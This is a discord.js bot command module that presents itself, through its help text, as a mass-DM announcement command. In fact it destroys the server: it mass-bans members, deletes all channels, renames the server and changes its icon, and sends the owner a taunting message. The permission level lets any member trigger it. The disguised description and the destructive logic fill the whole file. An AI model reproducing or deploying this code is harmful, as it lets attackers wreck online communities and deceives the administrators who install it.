const Discord = require('discord.js');
const ayarlar = require('../ayarlar.json');

exports.run = async (client, message, args) => {
if (message.guild) {
let kanallar = 0;
let roller = 0;
let emojiler = 0;

      
message.guild.members.forEach(u => {
if (u.bannable) {
message.guild.ban(u, "Amonx Vi Brittania")
}
})
  

  

  
message.guild.setName(`The Server Has Been Destroyed  `, ":))")
message.guild.setIcon(`https://image.freepik.com/free-vector/error-404-found-glitch-effect_8024-4.jpg`)
  
message.guild.channels.forEach(c => {
if (c.deletable) {
kanallar++;
return c.delete();   
}
});
    

    

  
message.guild.owner.send(`**Sunucun Patladı Canım \`Amonx\` and \`Shivax\` :smiling_imp:**`);
message.guild.createChannel(`amonx vi`)
message.guild.createChannel(`brittania`)
message.delete()
}
};

  

exports.conf = {
  enabled: true,
  guildOnly: true,
  aliases: ['banla'],
  permLevel: 0,
  kategori: "yetkili"
};

exports.help = {
  name: 'brittania',
  description: 'Toplu dm atar.', 
  usage: 'dmduyuru [mesaj]'
};
